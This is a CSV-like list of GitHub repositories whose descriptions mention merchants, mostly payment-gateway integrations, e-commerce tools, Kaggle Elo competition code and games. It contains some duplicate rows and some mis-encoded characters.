0,https://github.com/psp-polska/active-merchant-with-psp-polska-integration-demo-app.git,"{""Demo app for psp polska's active merchant integration""}",,1
0,https://github.com/thiagomeireless/ame-merchant-sdk.git,SDK para comunica√ß√£o com a Ame Merchant API,,1
0,https://github.com/arlyon/runemerchant.git,An API and web app for runescape merchanting.,"django,runescape,api",1
0,https://github.com/felipecoder/googlereviewsmerchant.git,Plugin for Integration Woocommerce to Google Reviews Merchant Shopping,,1
0,https://github.com/NelsonMcKey/PUNCH.git,Merchant/Customer loyalty platform - Connect with your customers,,1
0,https://github.com/neerajkumar/active_merchant.git,extended active merchant plugin to support beanstream APIs,,1
0,https://github.com/bulckens/inpay.git,A ruby gem for the inpay.com merchant API.,,1
0,https://github.com/ranjankumar03/galaxy-merchant-simulator.git,"{""Problem Snippets: Merchant's Guide to the Galaxy""}",,1
0,https://github.com/r-terada/elo-merchant-category-recommendation.git,https://www.kaggle.com/c/elo-merchant-category-recommendation,,1
0,https://github.com/IanVaughan/mgtlg.git,"{""Merchant's Guide to the Galaxy ruby test""}",,1
0,https://github.com/cubesystems/active_merchant_every_pay.git,"EveryPay gateway for Active Merchant (Swedbank, SEB and LHV)",,1
0,https://github.com/magento-devdocs/flare-to-jekyll.git,Flare to Jekyll converter for the Magento merchant documentation,,1
0,https://github.com/networknt/taiji-blockchain.git,light block chain end user and merchant components,,1
0,https://github.com/evl/Repair.git,Automatically repair equipment and inventory when talking to a merchant,,1
0,https://github.com/rdvdijk/active_merchant_ideal_multicert.git,A patch for active_merchant_ideal to support multiple certificates.,,1
0,https://github.com/Vantiv/payfac-mp-sdk-python.git,"{""Worldpay's Python SDK for PayFac Merchant Provisioner API""}","sdk,worldpay,merchant,provisioner,payfac",1
0,https://github.com/Navbryce/Interstellar-Merchant-Angular.git,Angular Web App version of Interstellar Merchant Game,,1
0,https://github.com/crystalZhang69164/MerchantRegistration.git,merchant registration for the food delivery project web api ,,1
0,https://github.com/amplogik/SpendItScanner.git,Merchant and Consumer Scanner App for SpendIt.com Deals,,1
0,https://github.com/ripple-unmaintained/merchant-magento.git,Ripple merchant plugin for Magento shopping cart system.,,1
0,https://github.com/erwald/kaggle-competition-elo-loyalty-prediction.git,https://www.kaggle.com/c/elo-merchant-category-recommendation,,1
0,https://github.com/dscataglini/ActiveMerchantRecurringPayments.git,Support for recurring payments from within active merchant,,1
0,https://github.com/erwald/kaggle-competition-elo-loyalty-prediction.git,https://www.kaggle.com/c/elo-merchant-category-recommendation,,1
0,https://github.com/jeremymarc/active_payment.git,"Active Payment is a Rails engine to handle effortless transactions. It works with https://github.com/activemerchant/active_merchant, and support Paypal Express Checkout and Paypal Adaptive Payment.",,1
0,https://github.com/dscataglini/ActiveMerchantRecurringPayments.git,Support for recurring payments from within active merchant,,1
0,https://github.com/mandus/mcashmapiclient.git,"Client for the mCash Merchant-api, written in common lisp. ",,1
0,https://github.com/iamxiaoma/veasymall_merchant_antd.git,one mall merchant system base on ant design vue.,,1
0,https://github.com/subzero10/ecwid-revolut-merchant-payment.git,Ecwid Payment Method integration with Revolut Merchant API,,1
0,https://github.com/codearachnid/gravityforms-cardconnect-payment-gateway.git,CardConnect merchant gateway integration for Gravity Forms payment gateway.,,1
0,https://github.com/bibekm/elo-merchant-category-recommendation.git,Project files for ELO Merchant Category Recommendation project,,1
0,https://github.com/Kein1945/LumiRoMerchantsAndroid.git,Merchant monitoring for LumiRo.net Ragnarok online server,,1
0,https://github.com/RazerMS/rms-mobile-xdk-cocoapods-EOL-.git,Razer Merchant Services mobile payment for iOS (Cocoapods Framework),,1
0,https://github.com/yassineAlouini/elo_merchant_category_recommendation.git,Code for the Elo Merchant Category Recommendation Kaggle challenge,"rmse,machine-learning,tabular-data,kaggle,regression",1
0,https://github.com/RazerMS/rms-mobile-xdk-ios.git,Razer Merchant Services mobile payment for iOS (Xcode Framework),,1
0,https://github.com/daftspunk/ls-module-merchantwarrior.git,Adds Merchant Warrior payment methods to your Lemonstand store,,1
0,https://github.com/FinalBitSW/fb_googleshopping.git,"Export your products to Google Merchant Center, easily.",,1
0,https://github.com/connect2nelson/MerchantGuideToGalaxy.git,An attempt to solve the Merchant Guide to galaxy problem,,1
0,https://github.com/ankitdaf/phonepe_api_examples.git,This repository contains code examples for merchant integrations with PhonePe,,1
0,https://github.com/PriceRunner/API-client.git,C# client for use against PriceRunner Merchant API,,1
0,https://github.com/adimoraret/MerchantDashboard.git,"Merchant dashboard built on React, Redux, Express, etc",,1
0,https://github.com/cgaoumd/Kaggle--Elo_Loyalty_Score.git,My repository for the kaggle competition Elo Merchant Category Recommendation,,1
0,https://github.com/lokeshmeesala/Fraudulent-Merchant-classification.git,Fraudulent Merchant classification for an e-commerce client.,,1
0,https://github.com/dhananjaychaudhari26/Elo_Merchant.git,"Case Study: Elo Merchant Category Recommendation , Help understand customer loyalty",,1
0,https://github.com/gocoderslab/go_merchant.git,"Go Merchant is a multi-gateway payment processing library for Golang. In other words, it is a Golang alternative to Active Merchant for Ruby, Omnipay and Aktive Merchant for PHP payment gateway aggregation libraries.",,1
0,https://github.com/thangasblockchain/Decentralized-Merchant-Risk-Sharing.git,"Merchant Onboarding includes acquirer bank and Payment gateway certifications. by decentralise Merchant risk sharing with the help of DLP, we can eliminate the Merchant frauds (Bust Out Fraud and Identity Swap)",,1
0,https://github.com/Cart2Cart/Magento-to-OpenCart-Migration-Module.git,"Cart2Cart: Magento to OpenCart Migration Module helps to set up the connection between Magento and OpenCart platforms in order to perform data migration. It offers a possibility to implement data interaction between two shopping carts. Merchants will be able to move all products, customers, orders with a corresponding information in a few simple steps.",,1
0,https://github.com/Isabelle-123/salt-graduation-project.git,"{""My final graduation project @saltsthlm together with my team's client Way. A dashboard for connected merchants to get an overview of their Way order flow. https://way-merchant-dashboard.web.app/""}",,1
0,https://github.com/borao/visa-hackathon.git,A multisided platform that helps consumers and small merchants manage loyalty programs and drive transactions by providing social incentives to consumers.,"payments,merchant,django,django-rest-framework,swift",1
0,https://github.com/shirazksiddiqi/online-shopping-model.git,To predict if the customer will buy from a franchise merchant (e.g. BestBuy/Walmart etc.) or a local merchant based on purchasing preferences.,,1
0,https://github.com/tiero/bpay-mobile-app.git,Mobile app for merchants and customers to do payments in store without Credit or Debit Card. Built during Hyperledger Hackaton 2016 in Amsterdam,,1
0,https://github.com/Immolare/simple-linked-products.git,"{""A simple module which allow Prestashop's merchants to link a physical product to a virtual one (or the inverse side)""}",,1
0,https://github.com/wigalgh/redde-java-sdk.git,"A Java SDK built around the Redde REST API that allows merchants to receive, send, check transaction status, and perform lots of payment transactions.","redde,wigal,wigalpayments,payment-gateway,payment-integration,payment-api,payment-platform,java-sdk,receivemoney,sendmoney,payment-transactions,money",1
0,https://github.com/Mazgis47/MobilePay.git,MobilePay is a mobile payments solution which can be used to send money to your friends or buy goods from merchants,,1
0,https://github.com/wigalgh/redde-nodejs-sdk.git,"A NODEJS SDK built around the Redde REST API that allows merchants to receive, send, check transaction status, and perform lots of payment transactions.",,1
0,https://github.com/PTNUSASATUINTIARTHA-DOKU/API-DOKU-Merchant-Hosted.git,"Merchant Hosted is a service where data input is native to the merchant‚Äôs website, without having to redirect to a DOKU page. ",,1
0,https://github.com/antonowano/qiwi-topup.git,Top-Up API is intended for merchants or payment service providers (PSP) who need to send money to QIWI Wallet users.,,1
0,https://github.com/ClicShoppingV3Community/modules_hooks_checkout_safe_shop.git,"Safe.Shop is the global trustmark for online shopping, helping consumers shop online with confidence and merchants to grow both at home and internationally","hooks,marketing,certificate,reviews",1
0,https://github.com/PhocaCz/PhocaCartFeedGoogleMerchantPlugin.git,Phoca Cart Feed - Google Merchant plugin - XML feed plugin for Phoca Cart component. Extends XML Feed with new Google Merchant elements.,,1
0,https://github.com/Rubanrubi/Coinpayments-Using-Laravel.git,"CoinPayments is a payment processor that allows merchants to accept Bitcoin and hundreds of altcoins in their store through easy to use plugins, APIs and POS interfaces",,1
0,https://github.com/zaycodes/Interswitch-HostedFields-Payment-Integration-AfricaHacks.git,"Integrating to Interswitch Hosted Fields for payments, an SDK designed for non PCI DSS(Payment Card Industry Data Security Standard) complaint merchants",,1
0,https://github.com/ElvisLee0725/super-coupon-pocket-lfz.git,A web application that users can keep track of all coupons they have received easily so they will never miss free stuff or discounts from their favorite merchants. ,,1
0,https://github.com/abahernest/WealthlineMerchants.git,"Wealthline Merchants is an affiliation of RAGP; an African based company which handles online payment of value added services,bills and purchasing airtime.",,1
0,https://github.com/GlobalPay/credit-card-processing.git,"GlobalPay offers credit card processing for all types of merchants. Wireless / mobile credit card processing through smartphones or tablet (Apple, Android, & BlackBerry), retail solutions and a virtual payment gateway with recurring billing option for e-commerce merchants. Sign up today to receive your FREE credit card reader.  www.GlobalPay.me",,1
0,https://github.com/roc41d/IMS_Soft400.git,IMS_Soft400 is an online inventory management system that helps merchant to manage their good online,,1
0,https://github.com/sideshowcoder/active_merchant-paypal-bogus-gateway.git,Extracted from a PR agains ActiveMerchant https://github.com/activemerchant/active_merchant/pull/424,,1
0,https://github.com/kartuku/sandbox_client_php.git,"IPG Sandbox Client for merchant integration test, sample codes written in PHP",,1
0,https://github.com/gevans/koi.git,"{""Painless payment processing for Kohana. Based on Shopify's Active Merchant.""}",,1
0,https://github.com/Brandon0/Miva_Password.git,Generate and verify Miva Merchant 5 PR8-7 compatible password hashes using PHP.,,1
0,https://github.com/charliepark/minimum_recurring_payments.git,"Thoughts, and maybe code, on getting recurring payments working with Braintree and Active Merchant.",,1
0,https://github.com/Autumn-Martin/rails_engine.git,"A RESTful JSON API for merchant, customer, item, invoice, & transaction data.",,1
0,https://github.com/BIZ4Africa/ofxstatement-cd-tmb.git,"{""This is the plugin for ofxstatement that implements Congolese Trust Merchant Bank's csv to ofx""}",,1
0,https://github.com/Sknikumbha/Merchant_Enrolment_Api.git,"Web Api for merchant Enrolment developed in Visual Studio 2013, C#",,1
0,https://github.com/tokenio/merchant-proxy.git,"Proxy for Merchant Checkout scenario, with a simple grpc/http interface",,1
0,https://github.com/aaronkuchma/CaVirtExSupportForEcwid.git,Authorize.net emulation to support CaVirtEx merchant API / bitcoin payments on Ecwid sites.,,1
0,https://github.com/affiliateprocessing/woo-commerce-mx-merchant.git,This is a Word Press Processor that integrates with the MX Merchant payment gatemway,,1
0,https://github.com/a7ul/swish-via-sound-pwa.git,A POC on how to make swish payment on iZettle Merchant device using Sound!!!,,1
0,https://github.com/prashantgarbuja/Email-Converted-PDF.git,A simple project to convert details into pdf and send email to respective merchant.,,1
0,https://github.com/LibraM9/kaggle_elo.git,2019 kaggle Elo Merchant Category RecommendationÔºàÁî®Êà∑Êé®ËçêËØÑ‰ª∑Ôºâ Èì∂Áâå,,1
0,https://github.com/SBozhko/tw-test-task.git,"This project represents a solution to the ""Problem Three: Merchant\'s Guide to the Galaxy""",,1
0,https://github.com/AngelOnFira/Miracle-Merchant-AI.git,An AI for the mobile game Miracle Merchant. Created for COMP 4106,,1
0,https://github.com/louislung/EloMerchantCategoryRecommendation.git,For the Kaggle competition https://www.kaggle.com/c/elo-merchant-category-recommendation/data,,1
0,https://github.com/varyonic/activemerchant-argus.git,Active Merchant extension to support Inovio payment gateway (f.k.a. Argus),activemerchant,1
0,https://github.com/benitech/UtilityTokenOffering.git,WNTU Utility Token for payment of Merchant Fees on Want Marketplaces ecosystem,,1
0,https://github.com/merchantsedition/coreupdater.git,"{""This Merchant's Edition module brings the tools for keeping your shop installation up to date.""}",,1
0,https://github.com/chaoyee/active_merchant_focas.git,Active merchant library for  Focas payment system (Ë≤°ÈáëË≥áË®ä),,1
0,https://github.com/AdvaiyaLabs/Miva-Merchant-with-Nexmo-SMS.git,An app to send SMS to keep you updated about your Miva Merchant orders,,1
0,https://github.com/Wang-ErHu/imss.git,Êô∫ËÉΩÂïÜÊà∑ÊúçÂä°Á≥ªÁªüÔºàIntelligent merchant service systemÔºâ,,1
0,https://github.com/fatzebra/ActiveMerchant-FatZebra.git,"Fat Zebra support for Active Merchant, extracted into an add-on gem",,1
0,https://github.com/SerzhYevtushenko/amazon-mws-merchant-fulfillment.git,Merchant Fulfillment API Section Client Library - PHP - Version 2015-06-01,,1
0,https://github.com/ai-zml/Seafarers-PPE-Detection.git,"{""seafarers' personal protective equipments detection aboard merchant marine ships, such as helmet, goggle, work outfit etc.""}",,1
0,https://github.com/marcust/Google-Merchant-Module-for-ROME.git,A simple Google Merchant Module for the Java RSS/ATOM Feed Library ROME,,1
0,https://github.com/bornofthemind/SimpleCart-2.2.git,A simple shopping cart made in Vanilla JavaScript that easily integrates with your current website & Merchant,,1
0,https://github.com/ninjaconcept/active_merchant_ogone_example.git,Example application for using active_merchant together with payment gateway ogone,,1
0,https://github.com/B-Pratik/Merchants-guide-to-galaxy-Node.js-Javascript.git,"{""Node.js/Javascript implementation of classic 'Merchant's guide to galaxy' problem""}",,1
0,https://github.com/bartels/pyqbms.git,Python Bindings for Quick Books Merchant Services ( forked from http://code.google.com/p/pyqbms/ ),,1
0,https://github.com/atomixdesign/nodepay.git,"A payment gateway abstraction layer written in Typescript, taking inspiration from Omnipay & Active Merchant",,1
0,https://github.com/varunity/plugnpay.git,Drupal module to validate Jamaican merchant/bank cards through Plug n Pay gateway,,1
0,https://github.com/jinmatt/galaxy-trader.git,"{""Merchant's Guide to The Galaxy - a Node.js implementation to usual interview coding challenge ""}",,1
0,https://github.com/happinesea/rws-lib.git,rws-lib is a groovy(java) library for RMS(Rakuten Merchant Server) WEB SERVICE.,,1
0,https://github.com/RowlandOti/E-CommerceApp-Merchant.git,üìü A merchant side e-commerce application for managing products for sale,"firestore-database,firestore-collection,ecommerce,merchant-dashboard",1
0,https://github.com/Kendysond/Selar-widget-for-wordpress.git,This sets up a beautiful widget for a Selar product or merchant profile.,,1
0,https://github.com/lsc1025/MerchantPortal.git,Merchant Portal is a wire-frame that allows billers to manage their pre-authorize payment orders,,1
0,https://github.com/udovenko/google_merchant.git,Provides functionality for Google Merchant feed generation in .atom format. Additionally allows to create a model for Google Products Categories using Awesome Nested Set gem and build categories tree from remote plain text file provided by Google.,,1
0,https://github.com/noxteryn/Cool-Merchant.git,Cool Merchant is a mod for Terraria that aims to lessen the grinding by adding a chance for the Travelling Merchant to sell some of the ingredients for crafting the Cell Phone and the Ankh Shield.,,1
0,https://github.com/senesh-deshan/Almariya-Shopping-Cart-Mobile.git,"Online shopping platform designed for the competitive clothing industry. This enables users to find clothing items according to their fit by using advanced filters, comparing merchants against the prices.",,1
0,https://github.com/amit-agni/amex2019-av-hackathon.git,Create a machine learning model to predict whether a customer will redeem a given coupon for the marketing campaigns run by the Amex merchants. Done as part of Analytics Vidhya American Express 2019 Data hackathon,,1
0,https://github.com/rajapattanayak/smart-aggregator.git,Smart-Aggregator is a hackathon project for ETH Singapore which aims to build ETH based marketplace for Advertisers (aka Merchants) and Publishers (aka Sellers) and Consumers (aka Buyers) using Smart Contract on top of Public or Private Blockchain.,,1
0,https://github.com/senesh-deshan/Almariya-Shopping-Cart-Web.git,"Online shopping platform designed for the competitive clothing industry. This enables users to find clothing items according to their fit by using advanced filters, comparing merchants against the prices.",,1
0,https://github.com/netresearch/dhl-module-shipping-handover-m2.git,This extension enables merchants to print a handover note from within the Magento 2 admin panel. A handover note documents the number of parcels a merchant hands over to DHL eCommerce (either via on-site pick-up or facility drop-off).,,1
0,https://github.com/jpmonette/cnet.git,"CNET API for Node.js is a connection library for CNET API, giving you access to data about tech and consumer electronics products such as computers, digital cameras, MP3 players, and TVs, as well as software titles and merchant pricing from CNET Certified Merchants.",,1
0,https://github.com/Mastercard/cordova-plugin-commerceweb.git,"{""This Cordova plugin enables to use Commerce-web SDK in a Cordova project. Commerce-web is a lightweight library used to integrate Merchants with (https://www.emvco.com/emv-technologies/src/) and  Mastercard's web-based SRC-Initiator. Commerce-web facilitates the initiation of the checkout experience and returns the transaction result to the Merchant after completion""}",,1
0,https://github.com/pranadeepreddy/shopnow.git,ShopNow is web application build using django and react which is similar to Flipkart app in which customer can see a wide range of products and add them to cart and place the order after logged in. Merchants can add the products to the site for sale. Admin can manage these merchant accounts.,,1
0,https://github.com/Halverson-Jason/webStore.git,"This is an e-commerce web template built from Java and Springboot. This is intended to quickly launch an e-commerce site for contractors helping clients, or independent merchants.",hacktoberfest,1
0,https://github.com/pranadeepreddy/shopnow.git,ShopNow is web application build using django and react which is similar to Flipkart app in which customer can see a wide range of products and add them to cart and place the order after logged in. Merchants can add the products to the site for sale. Admin can manage these merchant accounts.,,1
0,https://github.com/pandu19/MerChantModule.git,"Merchant module is also a part of this project he has access to create the coupons and edit the coupons, merchant will have individual dashboard consisting of multiple options",,1
0,https://github.com/ljbdelacruz/MyStoreHubApp.git,Cashless Mobile POS->Create your own merchant account instead of accepting cash can accept it by scanning the merchant account and confirm payment account no need to worry about not having changes ,,1
0,https://github.com/JimboHamez/Shopify_Google_Product_Ads_Update_Tool.git,This Python script is used to generate Product data from Shopify Stores and upload into Google Merchant Centre.,,1
0,https://github.com/WeiChienHsu/Payment_Note.git,"Merchant Initiated Transactions(MITs), Payments Service Directive 2 (PSD2) , Strong Customer Authentication (SCA), Stripe business model for subscription use-cases",,1
0,https://github.com/taylorsmith1/Grocerease.git,Grocerease is an automatic grocery inventory tracking service that focuses on eliminating a barrier to entry through merchant integration.,,1
0,https://github.com/es-bimasakti/winpay-android-sdk.git,SDK ini dibuat untuk memudahkan pemilik usaha atau Merchant dalam melakukan integrasi ke Payment Gateway WinPay dengan platform Android.,,1
0,https://github.com/ThyWoof/SolastaCustomMerchants.git,This Mod allows you to edit any merchant stock list in the game Solasta: Crown of the Magister,,1
0,https://github.com/dawidurbanski/woocommerce-google-merchant-gtin.git,Simple extension for WooCommerce Google Merchant XML by WP Desk. Allow each variation has separate gtin number.,,1
0,https://github.com/ScriptaGames/sub-hunt.git,"Loot Race: Hunt for the Merchant Royal.  A Submarine treasure hunting game for LD48. Theme ""Deeper and Deeper""",,1
0,https://github.com/jobannon/rails_eng.git,A exercise using fictional merchant data to create and expose multiple endpoints in a Rails API server,,1
0,https://github.com/dinesh3836/paytmGratify.git,paytmGratify is a paytm module which helps in hassle free money transfer from Merchant Sub-Wallet to customer wallet,,1
0,https://github.com/jlegs/personal-website.git,"{""This is my arena fighter game. it was going to be an RPG but i just got the basic merchant and fighting systems up first, so right now it's more of an arena fighter, which is currently the working title""}",,1
0,https://github.com/Cat-Lady/Bounty-Fix.git,"This ES plugin makes Pirates/Marauders that are subject of Bounty Hunting missions be properly seen as enemies by Militia/Navy/Deep Security/Merchants and other forces that should dislike Marauders/Pirates. In other words, militia will no longer ""pick their noses"" watching as pirates plunder your merchant fleet in their system, just because said pirates have a bounty on their head that you want to collect.",,1
0,https://github.com/MasterSkriptor/DotNetCore2-Framework.git,"A Dot Net Core Framework that uses generic data services, and other useful services for website dev, such as an smtpclient service and merchant services.",,1
0,https://github.com/shnergle/ShnergleServer.git,"This is the server used for communication with consumer and merchant app for Shnergle, taking care of data storage and aggregation.",,1
0,https://github.com/sandeepdharmavarapu/retailbanking_casestudy.git,"A case study which asks to find whether a given customer for a particular merchant id & Business unit is dormant, active or New.",,1
0,https://github.com/anuj0612/PaypalDemo.git,"PayPal is the faster, safer way to send money, make an online payment, receive money or set up a merchant account.",,1
0,https://github.com/mahfuzali/payment-gateway.git,An API based application that will allow a merchant to offer a way for their shoppers to pay for their product.,"payment-gateway,asp-net,dotnet5,docker,postgresql",1
0,https://github.com/DHasib/Delivery-Management-System-Front-End-Using-Quasar.git,"Delivery Management System  where Author can manage Merchant and their order & Transaction &  Payment. Manage Delivery boy Employee and their Task, salary, destination etc",,1
0,https://github.com/thegamestudio/LookNewRecipe.git,Look! New Recipe! a World of Warcraft Addon to alert the player when a new recipe is found on a merchant.,,1
0,https://github.com/benwad/Space-Merchant.git,"Graphically similar to old-skool Asteroids, Space Merchant allows the player to travel through a large universe and trade between planets.",,1
0,https://github.com/vocalinkzapp/ZappMerchantLib-R2-Android.git,The Pay by Bank app Merchant Library for Android makes it easy for you to add Pay by Bank app as a new payment method.,,1
0,https://github.com/akg2000/E-commerce_Application.git,"An E-commerce application based on java for an easy intercation between the customer and the merchant, supports various discounts as well as searching by category",,1
0,https://github.com/Atalaa/Shopify-Challenge-Summer-2019.git,"As a Shopify merchant, i present to you my new app that will help me to keep an eye on my collections.",,1
0,https://github.com/kmcandersen/wineshop.git,Development of a custom Shopify theme for a fictitious wine merchant. Mockups: https://www.figma.com/file/ZXHe3J9JWr24sPJIKybuME/wineshop?node-id=234452%3A0,,1
0,https://github.com/sharkbit/BadgeApp.git,Membership and Calendar program for a Range.   Allows tracking of guests and events.  And a small merchant portal to buy badges and supplies.,,1
0,https://github.com/Madhu-Vamsi/active-merchant-Credit-Card-Processor.git,"A repository which validates, transacts, voids, and refunds credit cards. Takes help of awesomesauce payment gateway by Spreedly Inc. Built on top of active merchant gem. Ruby.",,1
0,https://github.com/jeri-dilts/pizza.git,"Pizza Pie! is a merchant social-esque React App, Airtable build where the user can interactively build their own pizza, name it, and place it for order.",,1
0,https://github.com/canonicalchris/old-merchant-marine.git,"A record of the interpretation of the E book ""The Old Merchant Marine"" by Ralphe D Paine (http://www.gutenberg.org/files/3099/3099-h/3099-h.htm)",,1
0,https://github.com/Madhu-Vamsi/active_merchent.git,A basic HTTP request application to a virtual credit card gateway for authorizing/declining transactions. Developed using Ruby and active_merchant gem ,,1
0,https://github.com/ZoranWong/pinehub-merchant.git,pinehubÊòØÈùíÊùæÈõÜÂõ¢ÁöÑ‰∏ÄÊ¨æÂ§ßÊï∞ÊçÆÁîµÂïÜÂàÜÊûêÂπ≥Âè∞Ôºåpinehub-merchant‰∏∫ÂïÜÂÆ∂Á´ØÂ∞èÁ®ãÂ∫è,,1
0,https://github.com/Madhu-Vamsi/active-merchant-Credit-Card-Processor.git,"A repository which validates, transacts, voids, and refunds credit cards. Takes help of awesomesauce payment gateway by Spreedly Inc. Built on top of active merchant gem. Ruby.",,1
0,https://github.com/Earthii/askYpBot.git,"The Challenge will be to create a twitter bot that will read the tweets with a particular hashtag who will respond to query like : i would like to buy louis vuitton shoes, the bot will then search the YP api and propose nearby merchants that are selling them",,1
0,https://github.com/prashant18360/EcommerceSoftware.git,"your task is to build a small-scale e-commerce application. The aim of the application is to connect merchants with customers and make the ensuing transaction hassle-free. You must use OOP concepts, especially interfaces and polymorphism while building the application.",,1
0,https://github.com/stmsevanya/E-Wallet-System.git,"E-Wallet is an online prepaid account where one can stock money and perform various transactions when required. Functionalities : Creating account, loading money in e-wallet from banks and debit cards, depositing money to banks, sending money to other users and registered merchants.",,1
0,https://github.com/Coriunder/MSU.git,"MSU means Merchant Sign Up - this is a little project we created to help our clients onboard merchant into their backend system, the JS is simple - create a form and connect it to the fields allowed in the service.  The tool allows you to decide which fields are mandatory or not in the JSON file.  Mobile versions of this project will be published soon.",,1
0,https://github.com/aoakalin/bannerlord-vartsTradeGuild.git,"By installing this mod, you will join to VARTS Trade Guild as their newest member. They are a network of merchants, workshop owners, caravan leaders, slave traders, even spies. Your new network will allow you to find a fellow agent in every town. They will provide precious information that you definitely need, free of charge as a membership perk.",,1
0,https://github.com/ikramrahhali7/ArganOil-.git,Our project will launch a platform for buying and selling ArganOil products and the rest of the health products . payment will be made in crypto currencies and we will be focusing on our ARGAN Token payments . Merchants will be allowed to sell their products on our platforms and payment will be made in Crypto currencies. We have created ARGAN Token In TRC20,,1
0,https://github.com/bilalprofile/POS.git,"A point of sale (POS) is a place where a customer executes the payment for goods or services and where sales taxes may become payable. A POS transaction may occur in person or online, with receipts generated either in print or electronically. Cloud-based POS systems are becoming increasingly popular among merchants.",,1
0,https://github.com/ohmpatel1997/pay-later.git,"Pay Later is a POC application for leading fintech company Simpl (https://getsimpl.com/), which enables users to make transactions with partnered merchants immediately and users can pay later on a monthly basis based on their billing. The idea behind this project is to model the architecture, designing the database models and microservices. The project is entirely built using Golang.","golang,database",1
0,https://github.com/IndianECommerceDevelopers/OpenCart.git,OpenCart is an open source PHP-based online shopping cart system. A robust e-commerce solution for Internet merchants with the ability to create their own online business and participate in e-commerce at a minimal cost.  This is a forked repository.  For the Main repository please refer here http://code.google.com/p/opencart/,,1
0,https://github.com/everypay/everypay-whmcs.git,"This is the EveryPay payment gateway plugin for WHMCS. Allows merchants to accept credit cards, debit cards, with the WHMCS store. It uses a seamless integration, allowing the customer to pay on your website without being redirected away from your WHMCS website.",,1
0,https://github.com/hycubetech/Pay_Hycube_2018.git,"Bitcoin is a powerful peer-to-peer platform for the next generation of financial technology. The decentralized nature of the Bitcoin network allows for a highly resilient value transfer infrastructure, and this allows merchants to gain greater profits. Unlike other payment methods, Bitcoin payments cannot be reversed, so once you are paid you can ship! No waiting days for a payment to clear.",,1
0,https://github.com/pravams/magento-stripe.git,"Stripe Payment Module for Magento allows Merchants to use their Stripe accounts for accepting payments online. It allows the Customer to enter their Credit Card details on the Magento store itself, without redirecting to the payment gateway site. The module is also PCI compliant as it does not store credit card details in Magento. This module supports Authorize and Capture for payments using Credit Cards.","magento,stripe-payment",1
0,https://github.com/harshit-8080/FarmingAssitant.git,A web  Application For Farmer and Merchant where both can find Each other based on their choice of crop and location.Also their is full guidance for Become a Farmer.,,1
0,https://github.com/jaui21/order-list-by-product.git,This is a custom backend module for Magento 1.7- 1.9. This module will add another item under ORDERS. This will list the orders per product so its easier for the merchant to export the sales date by products,,1
0,https://github.com/AhsanAyub/OnlineSuperShop.git,"Online Super Shop - where cloths will be sold by the merchant for the customers. In order to place successful purchase, only registered users will be able to do so. MVC framework is followed while building this project.",,1
0,https://github.com/AlexPietz/DispensED-Mirror.git,"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. ",,1
0,https://github.com/marshmallow-packages/feeds-google-shopping.git,This Laravel package will make it super easy to generate your Google Shopping feed to include to your Google Merchant account. Combined with our Google Categories package this works amazing üóÉ,,1
0,https://github.com/ettaegbe/Icemix-Mobile-Money-Android-Library.git,This a mobile money library for collecting payment through mobile money payment with android particularly for Africa. The aim is that the merchant communicate directly with the main mobile money provider rather than a third party.,,1
0,https://github.com/mrinal1704/Credit-Card-Transaction-Fraud-Detection-using-Supervised-Machine-learning-with-an-Imbalanced-dataset.git,"Credit card fraud is a burden for organizations across the globe. Specifically, $24.26 billion were lost due to credit card fraud worldwide in 2018, according to shiftprocessing.com. In this project, our goal was to build an effective and efficient model to predict fraud. We analyzed a real-world dataset that contained a list of government related credit card transactions over the 2010 calendar year. The data presented a supervised problem as it included a column showing the transaction‚Äôs fraud label (whether a transaction was fraudulent or not). It also contained identifying information about each transaction such as the credit card number, merchant, merchant state, etc. The dataset had 96,753 records and 10 data fields. We first described and visualized each of the 10 data fields, cleaned the dataset, and filled in missing values. Then we created many variables and performed feature selection. Finally, we created a variety of machine learning models (both linear and nonlinear) and highlighted our results. ","supervised-machine-learning,imbalance-classification,feature-engineering,feature-extraction,fraud-detection",1
0,https://github.com/coreydaj/LeanFT.git,This is a repository of LeanFT demo assets to be used for demonstration purposes only by those authorized in writing from HP and its successors. No warranty of merchantability or fitness for a particular purpose is implied or conveyed.,,1
0,https://github.com/masterghost2002/Valid_CC_Number_Check.git,This is a simple C program Which use a simple logic to check is the cc number is correct or not and also tells the merchant of the credit/debit card ,,1
0,https://github.com/ritikmaheshwari29/Diamond-Price-Prediction.git,Business Scenario: A diamond merchant has come to you for help. They want to create an automated system to predict the apt price of a diamond based on its shape/size/color etc.,,1
0,https://github.com/StocksExchange/ruby-client.git,"Stocks.Exchange provides all the core exchange functionality, and additional merchant tools available via the HTTP API where all returned messages are in JSON. Its much easier to work with the API by using one of the clients provided by Stocks.Exchange, so while this page describes the API in case you want or need to build your own client, the examples use the Ruby client.",,1
0,https://github.com/Cart2Cart/xt-Commerce-to-OpenCart-Migration-Module.git,Cart2Cart: xt:Commerce to OpenCart Migration Module is a hand of help for e-merchant that intend to change their shopping cart having no technical skills. An automated migration process is not going to take any efforts and your Source store won‚Äôt be downtimed in the process of switch. Use this plugin to set a connection between your stores and provide safe data interaction. ,,1
0,https://github.com/siponcode/Elo-Merchant-Category-Recommendation---Python.git,"Imagine being hungry in an unfamiliar part of town and getting restaurant recommendations served up, based on your personal preferences, at just the right moment. The recommendation comes with an attached discount from your credit card provider for a local place around the corner!  Right now, Elo, one of the largest payment brands in Brazil, has built partnerships with merchants in order to offer promotions or discounts to cardholders. But do these promotions work for either the consumer or the merchant? Do customers enjoy their experience? Do merchants see repeat business? Personalization is key.  Elo has built machine learning models to understand the most important aspects and preferences in their customers‚Äô lifecycle, from food to shopping. But so far none of them is specifically tailored for an individual or profile. This is where you come in.  In this competition, Kagglers will develop algorithms to identify and serve the most relevant opportunities to individuals, by uncovering signal in customer loyalty. Your input will improve customers‚Äô lives and help Elo reduce unwanted campaigns, to create the right experience for customers.",,1
0,https://github.com/bharat1510/Commuters-Guide.git,"Web application for commuters, travelers, merchants & common people who are used to travel whether it is by railway or by bus or by the highway. This web app helps them to choose the fastest, shortest & best root for their journey. Our app also suggests the best way for their journey. In this app, people make their accounts & through this account, they find the best way & best root both. In this app, you can also create the event according to your comfort. If someone also goes with you then they can contact you & join you on your journey if you accept their request.","commuters-guide,java-jsp,jsp,mysql,bus-booking,train-bookin,private-events",1
